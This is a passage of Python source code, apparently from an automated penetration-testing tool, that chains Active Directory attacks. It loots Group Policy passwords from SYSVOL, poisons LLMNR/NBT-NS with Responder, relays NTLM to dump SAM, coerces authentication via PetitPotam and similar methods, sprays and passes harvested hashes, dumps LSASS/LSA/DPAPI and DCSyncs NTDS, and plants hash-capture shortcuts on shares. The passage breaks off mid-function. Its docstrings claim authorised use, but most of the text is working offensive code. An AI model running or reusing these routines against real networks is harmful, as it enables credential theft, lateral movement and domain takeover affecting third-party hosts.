                    dom = ""                     # an IP isn't a domain → workgroup/local auth
                pw = "" if m.group(2) == "<blank>" else m.group(2)
                key = (dom.lower(), m.group(1).lower(), pw)
                if key not in seen:
                    seen.add(key)
                    out.append((dom, m.group(1), pw))
    return out


def _smb_gpp_attempts(ip: str, port: str, proto: str) -> list:
    """(domain, user, pass, label) auth attempts: harvested creds first, then null & guest."""
    attempts = [(dom, user, pw, f"{dom}\\{user}" if dom else user)
                for dom, user, pw in _gather_smb_creds(ip, port, proto)]
    attempts.append(("", "", "", "null session"))
    attempts.append(("", "guest", "", "guest"))
    return attempts


def _smb_auth_smbclient(dom: str, user: str, pw: str) -> list:
    """smbclient auth args for a cred (null → -N)."""
    if not user:
        return ["-N"]
    who = f"{dom}\\{user}" if dom else user
    return ["-U", f"{who}%{pw}"]


def _smb_auth_nxc(dom: str, user: str, pw: str) -> list:
    """netexec auth args for a cred."""
    args = ["-u", user or "", "-p", pw or ""]
    if dom:
        args += ["-d", dom]
    return args


def _smb_walk_grep(smbclient: str, ip: str, share: str, auth: list, deadline: float) -> tuple:
    """Walk one SYSVOL/NETLOGON share, grep GPP/autologin/secret content in memory (files
    fetched to a temp path, read, deleted). Returns (creds, secrets, inv)."""
    import tempfile
    import time
    creds, secrets, inv = [], [], []
    listing = _smb_recurse_ls(smbclient, ip, share, auth)
    if not listing:
        return creds, secrets, inv
    tmpdir = tempfile.mkdtemp(prefix="pshunter_smb_")
    try:
        for path, size in listing:
            if not _SMB_GPP_RE.search(path):
                continue
            inv.append((share, path, size))
            if time.time() > deadline or size == 0 or size > _SMBLOOT_MAX_FILE:
                continue
            data = _smb_fetch(smbclient, ip, share, path, auth, tmpdir)
            if not data:
                continue
            text = data.decode("utf-8", "ignore")
            loc = f"{share}\\{path}"
            for mm in re.finditer(r'cpassword\s*=\s*"?([A-Za-z0-9+/=]{8,})"?', text):
                pw = _smb_gpp_decrypt(mm.group(1))
                um = re.search(r'(?:userName|newName|accountName|runAs)\s*=\s*"([^"]+)"', text)
                who = (um.group(1) if um else "unknown")
                dom = who.split("\\")[0] if "\\" in who else ""
                if pw:
                    creds.append((dom, who.split("\\")[-1], pw, f"GPP cpassword @ {loc}"))
                else:
                    secrets.append(f"cpassword blob @ {loc} (gpp-decrypt missing)")
            am = re.search(r'DefaultPassword[^>]*value="([^"]+)"', text)
            if am:
                au = re.search(r'DefaultUserName[^>]*value="([^"]+)"', text)
                who = au.group(1) if au else "autologon"
                dom = who.split("\\")[0] if "\\" in who else ""
                creds.append((dom, who.split("\\")[-1], am.group(1), f"GPP autologin @ {loc}"))
            for label, _snip in _smb_grep_secrets(text):
                secrets.append(f"{label} @ {loc}")
    finally:
        try:
            os.rmdir(tmpdir)
        except OSError:
            pass
    return creds, secrets, inv


def _parse_gpp_module(out: str) -> list:
    """(user, pass) pairs from a netexec gpp_password / gpp_autologin module run."""
    users = re.findall(r"[Uu]sername:\s*(\S+)", out)
    passwds = re.findall(r"[Pp]assword:\s*(\S+)", out)
    return [(u, p) for u, p in zip(users, passwds) if p and p.lower() != "none"]


def _tool_smb_gpp(ip: str, port: int, proto: str) -> str:
    """SMB step 4 tool: loot the DC's SYSVOL / NETLOGON for GPP cpassword (all GPP XML
    types), GPP autologin (registry.xml), and secrets in logon scripts / unattend.xml.
    Authenticated & DC-targeted: tries harvested creds (smb-creds / manual-creds) first,
    then null / guest. netexec runs its gpp_password + gpp_autologin modules; smbclient
    walks the shares and greps in memory (files fetched to a temp path, read, deleted —
    no loot on disk). Recovered creds are decrypted and stored. Read-only. A host with no
    SYSVOL/NETLOGON (not a DC) or no accepted session raises. Authorised targets only."""
    import time
    deadline = time.time() + _SMBGPP_DEADLINE
    nxc = shutil.which("netexec") or shutil.which("nxc")
    smbclient = shutil.which("smbclient")
    if not nxc and not smbclient:
        raise RuntimeError("no SMB tooling found — install netexec and/or smbclient")
    attempts = _smb_gpp_attempts(ip, port, proto)

    creds_all, secrets_all, inv_all = [], [], []
    used, is_dc = None, False

    if smbclient:                                # find a session that can reach SYSVOL/NETLOGON
        for dom, user, pw, label in attempts:
            if time.time() > deadline:
                break
            auth = _smb_auth_smbclient(dom, user, pw)
            _, lo = _smb_run([smbclient, "-L", f"//{ip}/"] + auth, 40)
            shares = re.findall(r"^\s+(\S+)\s+Disk\b", lo, re.M)
            dc_shares = [s for s in shares if s.upper() in ("SYSVOL", "NETLOGON")]
            if not dc_shares:
                continue
            is_dc, used = True, label
            for share in dc_shares:
                c, s, i = _smb_walk_grep(smbclient, ip, share, auth, deadline)
                creds_all += c
                secrets_all += s
                inv_all += i
            break

    if nxc:                                      # authoritative GPP modules (decrypt for us)
        for dom, user, pw, label in attempts:
            if time.time() > deadline:
                break
            base = [nxc, "smb", ip] + _smb_auth_nxc(dom, user, pw)
            authed = False
            for mod in ("gpp_password", "gpp_autologin"):
                _, out = _smb_run(base + ["-M", mod], 90)
                if re.search(r"\b445\b.*\[\+\]", out):
                    authed, is_dc = True, True
                for u, p in _parse_gpp_module(out):
                    creds_all.append((u.split("\\")[0] if "\\" in u else "",
                                      u.split("\\")[-1], p, f"nxc {mod}"))
            if authed:
                used = used or label
                break

    if not is_dc:
        raise RuntimeError(f"{ip}:{port} — no SYSVOL/NETLOGON reachable "
                           "(not a DC, or valid domain creds are needed)")

    seen, creds = set(), []                      # dedup creds by (user, pass)
    for dom, user, pw, src in creds_all:
        k = (user.lower(), pw)
        if k not in seen:
            seen.add(k)
            creds.append((dom, user, pw, src))
    if creds:                                    # persist for later exec/spray/dcsync steps
        blocks = _load_manual_block(ip, port, proto, "smb-creds")
        for dom, user, pw, src in creds:
            host = dom or ip
            line = f"! {user}:{pw or '<blank>'} @ {src} [{host}]"
            blocks.setdefault(host, [])
            if line not in blocks[host]:
                blocks[host].append(line)
        _save_manual_block(ip, port, proto, "smb-creds", blocks)

    secrets = list(dict.fromkeys(secrets_all))
    lines = [f"[*] Auth: {used}   SYSVOL/NETLOGON looted"]
    for dom, user, pw, src in creds:
        who = f"{dom}\\{user}" if dom else user
        lines.append(f"✗ CRED {who}:{pw} ({src})")
    for desc in secrets:
        lines.append(f"✗ SECRET {desc}")
    for share, path, size in inv_all[:40]:
        lines.append(f"· FILE {share}\\{path} ({size} b)")
    if len(inv_all) > 40:
        lines.append(f"· … +{len(inv_all) - 40} more files")
    lines.append(f"\n[*] {len(inv_all)} GPP/script files · {len(creds)} cred(s) · {len(secrets)} secret(s)")
    return f"SYSVOL / NETLOGON GPP loot — {ip}:{port}/{proto}  (read-only)\n\n" + "\n".join(lines)


# ── SMB step 5: LLMNR / NBT-NS / mDNS poisoning + NetNTLM capture ──────────────
_SMBPOISON_DEADLINE = 600        # s — how long Responder poisons before self-stopping
_RESPONDER_LOGS = "/usr/share/responder/logs"


def _iface_toward(ip: str) -> "str | None":
    """The local interface name on the route toward ``ip`` (for responder -I)."""
    try:
        out = subprocess.run(["ip", "-o", "route", "get", ip],
                             capture_output=True, text=True, timeout=5).stdout
    except (OSError, subprocess.SubprocessError):
        return None
    m = re.search(r"\bdev\s+(\S+)", out or "")
    return m.group(1) if m else None


def _responder_hash_lines() -> dict:
    """{hash line -> 'NetNTLMv1'|'NetNTLMv2'} for every capture currently in the log dir;
    the version is read from the filename (…-NTLMv2-… / …-NTLMv1-…), which is authoritative."""
    out = {}
    try:
        names = os.listdir(_RESPONDER_LOGS)
    except OSError:
        return out
    for fn in names:
        if not fn.endswith(".txt"):
            continue
        typ = "NetNTLMv2" if "NTLMv2" in fn else ("NetNTLMv1" if "NTLMv1" in fn else None)
        if not typ:
            continue
        try:
            with open(os.path.join(_RESPONDER_LOGS, fn), errors="ignore") as fh:
                for ln in fh:
                    if "::" in ln:
                        out[ln.strip()] = typ
        except OSError:
            pass
    return out


def _tool_smb_poison(ip: str, port: int, proto: str) -> str:
    """SMB step 5 tool: ACTIVE LLMNR / NBT-NS / mDNS poisoning + NetNTLM capture with
    Responder for a bounded window, then self-stops (like the timed HTTP tools). Runs on
    the interface toward the target, captures NetNTLMv1/v2 from any host coerced into
    authenticating, parses the NEW hashes into the DB (findings + a netntlm store for a
    later crack / relay step) and reports the crack command. Requires root (privileged
    ports). This poisons the WHOLE local segment — it affects third-party hosts, not just
    the target. Authorised internal engagements ONLY."""
    import signal
    if not _is_root():
        raise RuntimeError("Responder needs root (binds privileged ports) — re-launch under sudo")
    exe = shutil.which("responder")
    if not exe:
        raise RuntimeError("responder not found — install it to poison LLMNR/NBT-NS")
    iface = _iface_toward(ip)
    if not iface:
        raise RuntimeError(f"could not determine the local interface toward {ip}")

    before = _responder_hash_lines()
    proc = subprocess.Popen([exe, "-I", iface], stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL,
                            start_new_session=True)
    try:
        proc.wait(timeout=_SMBPOISON_DEADLINE)
    except subprocess.TimeoutExpired:
        proc.send_signal(signal.SIGINT)          # Ctrl-C → Responder flushes its logs
        try:
            proc.wait(timeout=15)
        except subprocess.TimeoutExpired:
            proc.kill()
    after = _responder_hash_lines()
    new = sorted(set(after) - set(before))

    caps, seen = [], set()
    for ln in new:
        user = ln.split("::", 1)[0]
        rest = ln.split("::", 1)[1] if "::" in ln else ""
        dom = rest.split(":", 1)[0] if rest else ""
        typ = after.get(ln, "NetNTLM")
        if (dom, user, typ) not in seen:
            seen.add((dom, user, typ))
            caps.append((dom, user, typ))
    if new:                                      # persist raw hashes for a later crack/relay step
        save_scripts(ip, [{"id": "netntlm", "port": port, "proto": proto, "output": "\n".join(new)}])

    has_v2 = any(t == "NetNTLMv2" for _d, _u, t in caps)
    has_v1 = any(t == "NetNTLMv1" for _d, _u, t in caps)
    lines = [f"[*] Interface: {iface}   toward {ip}",
             f"[*] Responder ran up to {_SMBPOISON_DEADLINE // 60} min · "
             f"captured {len(new)} hash line(s), {len(caps)} distinct account(s)"]
    for dom, user, typ in caps:
        who = f"{dom}\\{user}" if dom else user
        lines.append(f"✗ HASH {who} ({typ})")
    if new:
        modes = " / ".join(x for x in ("5600 (v2)" if has_v2 else "", "5500 (v1)" if has_v1 else "") if x)
        lines.append(f"· crack: hashcat -m {modes} <hashes.txt> rockyou.txt   "
                     "(or relay → step 6 when SMB signing is off)")
        lines.append(f"· raw hashes saved to the netntlm store (source: {_RESPONDER_LOGS})")
    else:
        lines.append("· no hashes captured — quiet segment / no poisonable traffic in the window")
    return f"LLMNR/NBT-NS poisoning — {iface}  (active capture)\n\n" + "\n".join(lines)


# ── SMB step 6: NTLM relay to signing-off hosts → dump SAM ─────────────────────
_SMBRELAY_DEADLINE = 600         # s — how long ntlmrelayx listens before self-stopping


def _gather_relay_targets() -> list:
    """Every host where smb-enum found SMB signing 'not required' — the valid relay targets."""
    targets = []
    for row in fetch_hosts():
        hip = row[0]
        for _port, _proto, script, _state, _cve, _risk, summary in fetch_vulns(hip):
            if script == "smb-enum" and "signing not required" in (summary or "").lower():
                if hip not in targets:
                    targets.append(hip)
                break
    return targets


def _parse_sam_dump(text: str) -> list:
    """(user, nthash) pairs from pwdump-format SAM output (user:rid:lm:nt:::)."""
    return [(u, nt) for u, nt in
            re.findall(r"^(\S+?):\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32}):::", text or "", re.M)]


def _tool_smb_relay(ip: str, port: int, proto: str) -> str:
    """SMB step 6 tool: ACTIVE NTLM relay with ntlmrelayx to every host where smb-enum found
    SMB signing 'not required', dumping SAM on a successful relay. Runs for a bounded window
    then self-stops (like the timed HTTP tools). It only listens/relays — a driver must make
    a victim authenticate to us: run poison (step 5) or coerce (step 7) alongside. Dumped
    hashes land in the DB (findings + smb-creds for pass-the-hash). Requires root. This
    executes against third-party hosts — authorised internal engagements ONLY."""
    import signal
    import tempfile
    if not _is_root():
        raise RuntimeError("ntlmrelayx needs root (binds SMB/HTTP) — re-launch under sudo")
    exe = shutil.which("impacket-ntlmrelayx") or shutil.which("ntlmrelayx.py")
    if not exe:
        raise RuntimeError("ntlmrelayx not found — install impacket to relay NTLM")
    targets = _gather_relay_targets()
    if not targets:
        raise RuntimeError("no signing-off relay targets — run smb-enum first "
                           "(needs a host with SMB signing 'not required')")

    workdir = tempfile.mkdtemp(prefix="pshunter_relay_")
    tf = os.path.join(workdir, "targets.txt")
    with open(tf, "w") as fh:
        fh.write("\n".join(f"smb://{t}" for t in targets) + "\n")
    logf = os.path.join(workdir, "relay.log")
    with open(logf, "w") as lf:
        proc = subprocess.Popen([exe, "-tf", tf, "-smb2support"], cwd=workdir,
                                stdout=lf, stderr=subprocess.STDOUT,
                                stdin=subprocess.DEVNULL, start_new_session=True)
    try:
        proc.wait(timeout=_SMBRELAY_DEADLINE)
    except subprocess.TimeoutExpired:
        proc.send_signal(signal.SIGINT)
        try:
            proc.wait(timeout=15)
        except subprocess.TimeoutExpired:
            proc.kill()

    dumped, seen = [], set()                      # (target_ip, user, nthash)
    try:
        log_text = open(logf, errors="ignore").read()
    except OSError:
        log_text = ""
    for u, nt in _parse_sam_dump(log_text):       # ntlmrelayx prints SAM to stdout…
        if (u, nt) not in seen:
            seen.add((u, nt))
            dumped.append((targets[0] if len(targets) == 1 else "?", u, nt))
    try:                                          # …and writes <ip>_samhashes.sam loot files
        for fn in os.listdir(workdir):
            m = re.match(r"(\d+\.\d+\.\d+\.\d+).*sam", fn, re.I)
            if not m:
                continue
            for u, nt in _parse_sam_dump(open(os.path.join(workdir, fn), errors="ignore").read()):
                if (u, nt) not in seen:
                    seen.add((u, nt))
                    dumped.append((m.group(1), u, nt))
    except OSError:
        pass

    if dumped:                                     # persist NT hashes for pass-the-hash exec
        blocks = _load_manual_block(ip, port, proto, "smb-creds")
        for tip, user, nt in dumped:
            line = f"! {user}:{nt} @ relayed SAM {tip} [{tip}]"
            blocks.setdefault(tip, [])
            if line not in blocks[tip]:
                blocks[tip].append(line)
        _save_manual_block(ip, port, proto, "smb-creds", blocks)

    lines = [f"[*] Relay targets (signing not required): {', '.join(targets)}",
             f"[*] ntlmrelayx ran up to {_SMBRELAY_DEADLINE // 60} min · "
             f"dumped {len(dumped)} account(s)"]
    for tip, user, nt in dumped:
        lines.append(f"✗ SAM {tip} {user}:{nt}")
    if dumped:
        lines.append("· pass-the-hash → step 10 (creds saved to smb-creds)")
    else:
        lines.append("· nothing relayed — run poison (r5) or coerce (r7) alongside to drive auth")
    return f"NTLM relay → SAM — {len(targets)} target(s)  (active, timed)\n\n" + "\n".join(lines)


# ── SMB step 7: authentication coercion → drive the relay ──────────────────────
_SMBCOERCE_DEADLINE = 180        # s — overall cap across auth attempts
_COERCE_METHODS = ("Petitpotam", "DFSCoerce", "ShadowCoerce", "Printerbug", "MSEven")


def _tool_smb_coerce(ip: str, port: int, proto: str) -> str:
    """SMB step 7 tool: coerce the target (a DC / Windows host) into authenticating back to
    our listener via netexec's coerce_plus (PetitPotam / DFSCoerce / ShadowCoerce / PrinterBug
    / MS-EVEN). This is the DRIVER for the relay — it captures nothing itself; the loot lands
    at the relay (step 6) or the poisoner (step 5), which must already be running. Target-
    scoped (this host), fires toward our source IP. Tries harvested creds then null. No root
    needed (outbound RPC). A missing netexec or an unreachable target raises. Authorised
    internal engagements ONLY."""
    import time
    nxc = shutil.which("netexec") or shutil.which("nxc")
    if not nxc:
        raise RuntimeError("netexec not found — install it to coerce authentication")
    lhost = _foothold_lhost(ip)
    if not lhost:
        raise RuntimeError(f"could not determine our source IP toward {ip} (LISTENER for coercion)")
    deadline = time.time() + _SMBCOERCE_DEADLINE

    methods, used, reached, authed = set(), None, False, False
    for dom, user, pw, label in _smb_gpp_attempts(ip, port, proto):
        if time.time() > deadline:
            break
        base = [nxc, "smb", ip] + _smb_auth_nxc(dom, user, pw)
        _, out = _smb_run(base + ["-M", "coerce_plus", "-o", f"LISTENER={lhost}", "METHOD=All"], 90)
        if re.search(r"\b445\b", out):
            reached = True
        ok = bool(re.search(r"\b445\b.*\[\+\]", out))
        for ln in out.splitlines():
            for meth in _COERCE_METHODS:
                if (meth.lower() in ln.lower()
                        and re.search(r"vulnerable|success|coerc|\[\+\]", ln, re.I)
                        and not re.search(r"not vulnerable|fail|error|\[-\]", ln, re.I)):
                    methods.add(meth)
        if ok:
            authed, used = True, label
            break                                 # a session that authenticates is enough
    if not reached:
        raise RuntimeError(f"{ip}:{port} did not answer the coercion attempt (unreachable / not SMB?)")

    lines = [f"[*] Target: {ip}   LISTENER: {lhost}   Auth: {used or 'null / none accepted'}"]
    for meth in sorted(methods):
        lines.append(f"✗ COERCE {meth}")
    if methods:
        lines.append("· fired METHOD=All toward the listener — run relay (r6) or poison (r5) "
                     "to catch the callback")
    elif authed:
        lines.append("· coercion fired (All) — check the listener (r6/r5) for the relayed/captured auth")
    else:
        lines.append("· no session accepted — coercion needs valid domain creds "
                     "(smb-loot r3 / smb-gpp r4) or an unauth PetitPotam")
    return f"Auth coercion — {ip}  (trigger → LISTENER {lhost})\n\n" + "\n".join(lines)


# ── SMB step 8: DC-critical CVEs (DETECTION ONLY) ─────────────────────────────
_SMBDCCVE_DEADLINE = 240         # s — overall cap


def _nxc_is_vuln(out: str) -> bool:
    """True when a netexec module output signals the target is vulnerable (not the reverse)."""
    return bool(re.search(r"vulnerable", out, re.I)) and \
        not re.search(r"not vulnerable|appears not|is not vulnerable", out, re.I)


def _tool_smb_dccve(ip: str, port: int, proto: str) -> str:
    """SMB step 8 tool: DETECTION-ONLY scan for DC-takeover CVEs — ZeroLogon (CVE-2020-1472,
    unauth), noPac (CVE-2021-42278/42287) and PrintNightmare (CVE-2021-34527), the last two
    needing valid domain creds (from smb-creds). netexec runs each check module; it NEVER
    exploits — ZeroLogon's exploit resets the DC machine-account password and is destructive,
    so only the safe probe is used. A confirmed hit is a CRITICAL finding (CVE auto-harvested
    + KEV-tagged). Unreachable / non-SMB raises; a patched DC returns a clean report.
    Authorised targets only."""
    nxc = shutil.which("netexec") or shutil.which("nxc")
    if not nxc:
        raise RuntimeError("netexec not found — install it to check DC CVEs")
    reached = False
    checks = []                                   # (label, cve, vulnerable | None)

    _, zl = _smb_run([nxc, "smb", ip, "-u", "", "-p", "", "-M", "zerologon"], 90)  # unauth
    if re.search(r"\b445\b", zl):
        reached = True
    checks.append(("ZeroLogon", "CVE-2020-1472", _nxc_is_vuln(zl)))

    authed_base = None                            # noPac / PrintNightmare need domain creds
    for dom, user, pw, _label in _smb_gpp_attempts(ip, port, proto):
        if not user:                              # skip null/anon for creds-required modules
            continue
        base = [nxc, "smb", ip] + _smb_auth_nxc(dom, user, pw)
        _, probe = _smb_run(base, 60)
        if re.search(r"\b445\b", probe):
            reached = True
        if re.search(r"\b445\b.*\[\+\]", probe):
            authed_base = base
            break
    for label, cve, mod in (("noPac", "CVE-2021-42278,CVE-2021-42287", "nopac"),
                            ("PrintNightmare", "CVE-2021-34527", "printnightmare")):
        if not authed_base:
            checks.append((label, cve, None))
            continue
        _, out = _smb_run(authed_base + ["-M", mod], 90)
        checks.append((label, cve, _nxc_is_vuln(out)))

    if not reached:
        raise RuntimeError(f"{ip}:{port} did not answer the DC-CVE scan (unreachable / not SMB?)")

    lines = []
    for label, cveid, vuln in checks:
        if vuln:                                  # CVE string ONLY on confirmed hits (hygiene)
            lines.append(f"✗ VULN {label} ({cveid})")
        elif vuln is None:
            lines.append(f"· {label}: not tested (no valid domain creds)")
        else:
            lines.append(f"· {label}: not vulnerable")
    return f"DC-critical CVEs — {ip}:{port}/{proto}  (detection only)\n\n" + "\n".join(lines)


# ── SMB step 9: credential spray across hosts (password reuse / lateral) ───────
_SMBSPRAY_DEADLINE = 300         # s — overall cap
_SMBSPRAY_MAX_CREDS = 60         # ceiling on distinct creds sprayed


def _smb_spray_hosts() -> list:
    """Every DB host with SMB open (445/139) — the spray surface."""
    hosts = []
    for row in fetch_hosts():
        hip = row[0]
        if any(p in (445, 139) and pr == "tcp" for p, pr, _st in fetch_ports(hip)):
            hosts.append(hip)
    return hosts


def _gather_all_smb_creds() -> list:
    """(domain, user, secret) creds harvested on ANY host — deduped across the DB."""
    out, seen = [], set()
    for row in fetch_hosts():
        for dom, user, secret in _gather_smb_creds(row[0], 445, "tcp"):
            key = (dom.lower(), user.lower(), secret)
            if user and key not in seen:
                seen.add(key)
                out.append((dom, user, secret))
    return out


def _tool_smb_spray(ip: str, port: int, proto: str) -> str:
    """SMB step 9 tool: validate every harvested credential / NT hash across all DB hosts with
    SMB open — password-reuse & lateral-movement surface. Each pair is the account's own real
    secret, tried once per host, so this does NOT spray many passwords at one account (no
    lockout risk); it never guesses. netexec reports where each cred is valid and where it is
    local admin (Pwn3d!). Confirmed access is saved to smb-creds (feeds the exec step). No root
    needed. Raises if there are no harvested creds yet or no SMB hosts. Authorised targets only."""
    nxc = shutil.which("netexec") or shutil.which("nxc")
    if not nxc:
        raise RuntimeError("netexec not found — install it to spray credentials")
    hosts = _smb_spray_hosts()
    if not hosts:
        raise RuntimeError("no SMB hosts recorded — run port enumeration first")
    creds = _gather_all_smb_creds()[:_SMBSPRAY_MAX_CREDS]
    if not creds:
        raise RuntimeError("no harvested creds to spray — run smb-loot / smb-gpp / smb-relay first")

    import time
    deadline = time.time() + _SMBSPRAY_DEADLINE
    valids, admins = [], []                       # (host, who, secret)
    for dom, user, secret in creds:
        if time.time() > deadline:
            break
        is_hash = bool(re.fullmatch(r"[a-fA-F0-9]{32}", secret))
        auth = ["-u", user] + (["-H", secret] if is_hash else ["-p", secret])
        if dom:
            auth += ["-d", dom]
        _, out = _smb_run([nxc, "smb", *hosts, *auth, "--continue-on-success"], 120)
        who = f"{dom}\\{user}" if dom else user
        for ln in out.splitlines():
            m = re.match(r"SMB\s+(\S+)\s+\d+\s+\S+\s+\[\+\]", ln)
            if not m:
                continue
            host = m.group(1)
            if "(Pwn3d!)" in ln:
                admins.append((host, who, secret))
            else:
                valids.append((host, who, secret))

    seen_line = _load_manual_block(ip, port, proto, "smb-creds")  # annotate confirmed access
    for host, who, secret in admins:
        line = f"! {who.split(chr(92))[-1]}:{secret} @ admin on {host} [{host}]"
        seen_line.setdefault(host, [])
        if line not in seen_line[host]:
            seen_line[host].append(line)
    if admins:
        _save_manual_block(ip, port, proto, "smb-creds", seen_line)

    lines = [f"[*] {len(creds)} cred(s) × {len(hosts)} SMB host(s)"]
    for host, who, _s in dict.fromkeys((a[0], a[1], None) for a in admins):
        lines.append(f"✗ ADMIN {who} @ {host}  (Pwn3d!)")
    for host, who, _s in dict.fromkeys((v[0], v[1], None) for v in valids):
        lines.append(f"✓ VALID {who} @ {host}")
    if not admins and not valids:
        lines.append("· no host accepted the harvested creds (no reuse found)")
    return f"Credential spray — {len(creds)}×{len(hosts)}  (reuse / lateral)\n\n" + "\n".join(lines)


# ── SMB step 10: valid creds / hash → command execution (confirm the channel) ──
_SMBEXEC_DEADLINE = 240          # s — overall cap


def _gather_smb_admin() -> list:
    """(host, user, secret) pairs confirmed local-admin by smb-spray (annotated in smb-creds)."""
    out, seen = [], set()
    for row in fetch_hosts():
        for sid, output in fetch_scripts(row[0], 445, "tcp"):
            if sid != "smb-creds":
                continue
            for m in re.finditer(r"! (\S+?):(\S*) @ admin on (\S+)", output or ""):
                secret = "" if m.group(2) == "<blank>" else m.group(2)
                key = (m.group(3), m.group(1).lower(), secret)
                if key not in seen:
                    seen.add(key)
                    out.append((m.group(3), m.group(1), secret))
    return out


def _tool_smb_exec(ip: str, port: int, proto: str) -> str:
    """SMB step 10 tool: confirm command execution over the admin creds smb-spray proved
    (Pwn3d!), running read-only recon (whoami / hostname) via netexec's -x (auto wmiexec →
    smbexec). Non-interactive — it proves the exec channel and its context; spawning an
    interactive, upgraded shell is step 13 (foothold). Uses pass-the-hash when the secret is
    an NT hash. No root. Raises if smb-spray hasn't confirmed any local admin yet.
    Authorised targets only."""
    import time
    nxc = shutil.which("netexec") or shutil.which("nxc")
    if not nxc:
        raise RuntimeError("netexec not found — install it to execute over SMB")
    admins = _gather_smb_admin()
    if not admins:
        raise RuntimeError("no confirmed admin creds — run smb-spray (r9) first")
    deadline = time.time() + _SMBEXEC_DEADLINE

    confirmed = []                                # (host, who, context)
    for host, user, secret in admins:
        if time.time() > deadline:
            break
        is_hash = bool(re.fullmatch(r"[a-fA-F0-9]{32}", secret))
        auth = ["-u", user] + (["-H", secret] if is_hash else ["-p", secret])
        _, out = _smb_run([nxc, "smb", host, *auth, "-x", "whoami & hostname"], 90)
        if not re.search(r"\b445\b.*\[\+\]", out):
            continue
        ctx = next((ln for ln in _nxc_body(out).splitlines() if ln.strip()), "")
        confirmed.append((host, user, ctx.strip()))

    lines = [f"[*] {len(admins)} admin cred(s) tried · {len(confirmed)} exec confirmed"]
    for host, who, ctx in confirmed:
        tail = f" → {ctx}" if ctx else ""
        lines.append(f"✗ EXEC {who} @ {host}{tail}")
    if confirmed:
        lines.append("· command execution confirmed via netexec (-x, auto wmiexec/smbexec) — "
                     "spawn an interactive shell at step 13 (foothold)")
    else:
        lines.append("· no exec — creds may have been rotated; re-run smb-spray (r9)")
    return f"Credential exec — {len(admins)} admin cred(s)  (channel confirm)\n\n" + "\n".join(lines)


# ── SMB step 11: dump SAM / LSA / LSASS / DPAPI + DCSync (NTDS) ────────────────
_SMBDUMP_DEADLINE = 360          # s — overall cap (NTDS can be slow)
_SMBDUMP_MAX_STORE = 100         # ceiling on NT hashes written back to smb-creds


def _tool_smb_dump(ip: str, port: int, proto: str) -> str:
    """SMB step 11 tool: over the admin creds smb-spray/smb-exec proved, dump credential
    material with netexec — SAM, LSA secrets, LSASS (lsassy) and DPAPI locally, plus DCSync
    the domain (--ntds) on every admin host (fails cleanly off a DC). Read-only loot: nothing
    is written to the target. Recovered NT hashes are saved back to smb-creds (feeding another
    spray pass — the creds loop closes). Uses pass-the-hash when the secret is an NT hash. No
    root. Raises without a confirmed admin cred. Authorised targets only."""
    import time
    nxc = shutil.which("netexec") or shutil.which("nxc")
    if not nxc:
        raise RuntimeError("netexec not found — install it to dump credentials")
    admins = _gather_smb_admin()
    if not admins:
        raise RuntimeError("no confirmed admin creds — run smb-spray (r9) / smb-exec (r10) first")
    deadline = time.time() + _SMBDUMP_DEADLINE

    per_host, all_hashes = [], []                 # per_host: (host, nlocal, nclear, nntds)
    for host, user, secret in admins:
        if time.time() > deadline:
            break
        is_hash = bool(re.fullmatch(r"[a-fA-F0-9]{32}", secret))
        auth = ["-u", user] + (["-H", secret] if is_hash else ["-p", secret])
        _, loc = _smb_run([nxc, "smb", host, *auth, "--sam", "--lsa", "--dpapi",
                           "-M", "lsassy"], 180)
        if not re.search(r"\b445\b.*\[\+\]", loc):
            continue
        body = _nxc_body(loc)                     # strip the 'SMB ip 445 HOST' prefix + [+] banner
        local = _parse_sam_dump(body)             # SAM / LSASS NT hashes
        clear = [(u, p) for u, p in re.findall(r"([A-Za-z0-9._-]+\\[A-Za-z0-9._$-]+):([^\s:]{3,})", body)
                 if not re.fullmatch(r"[a-fA-F0-9]{32}", p) and ":" not in p]
        _, nt = _smb_run([nxc, "smb", host, *auth, "--ntds"], 180)   # DCSync — no-op off a DC
        ntds = _parse_sam_dump(_nxc_body(nt))
        if local or clear or ntds:
            per_host.append((host, len(local), len(clear), len(ntds)))
        for u, h in local:
            all_hashes.append((host, u, h))
        for u, h in ntds:
            all_hashes.append((u.split("\\")[0] if "\\" in u else host, u.split("\\")[-1], h))

    stored = 0                                    # write NT hashes back for another spray pass
    if all_hashes:
        blocks = _load_manual_block(ip, port, proto, "smb-creds")
        for dom, user, h in all_hashes:
            if stored >= _SMBDUMP_MAX_STORE:
                break
            line = f"! {user}:{h} @ dumped {dom} [{dom}]"
            blocks.setdefault(dom, [])
            if line not in blocks[dom]:
                blocks[dom].append(line)
                stored += 1
        _save_manual_block(ip, port, proto, "smb-creds", blocks)

    lines = [f"[*] {len(admins)} admin host(s) · {stored} NT hash(es) saved for re-spray"]
    for host, nl, nc, nn in per_host:
        if nn:
            lines.append(f"✗ DCSYNC {host} → NTDS {nn} domain hash(es)")
        if nl or nc:
            bits = ", ".join(x for x in (f"{nl} SAM/LSASS hash(es)" if nl else "",
                                         f"{nc} cleartext" if nc else "") if x)
            lines.append(f"✗ DUMP {host} → {bits}")
    if not per_host:
        lines.append("· nothing dumped — creds may lack the rights, or were rotated")
    else:
        lines.append("· NT hashes saved to smb-creds (pass-the-hash → re-spray r9)")
    return f"Credential dump / DCSync — {len(admins)} admin host(s)\n\n" + "\n".join(lines)


# ── SMB step 12: writable share → planted LNK for hash capture (WRITES + reversible) ──
_SMBWRITABLE_DEADLINE = 180      # s — overall cap
_SMBWRITABLE_NAME = "~pshunter"  # recognizable, reversible marker for the planted LNK


def _tool_smb_writable(ip: str, port: int, proto: str) -> str:
    """SMB step 12 tool: plant a hash-capture Windows shortcut (LNK, via netexec slinky) on
    every writable share, its icon pointing at our listener — any user who browses the folder
    in Explorer is coerced into authenticating to us, and the NetNTLM lands at Responder (r5)
    / relay (r6). This is the ONLY SMB tool that WRITES to a target: the file is left in place
    (it must stay to catch a browser), marked with a recognizable name, and fully reversible —
    the report prints the exact CLEANUP command. Tries harvested creds then null/guest. Needs a
    listener running elsewhere. No root. Raises without netexec or a writable share. This
    coerces third-party hosts — authorised internal engagements ONLY."""
    import time
    nxc = shutil.which("netexec") or shutil.which("nxc")
    if not nxc:
        raise RuntimeError("netexec not found — install it to plant hash-capture files")
    lhost = _foothold_lhost(ip)
    if not lhost:
        raise RuntimeError(f"could not determine our listener IP toward {ip}")
    deadline = time.time() + _SMBWRITABLE_DEADLINE

    planted, used, reached = [], None, False
    for dom, user, pw, label in _smb_gpp_attempts(ip, port, proto):
        if time.time() > deadline:
            break
        is_hash = bool(re.fullmatch(r"[a-fA-F0-9]{32}", pw))
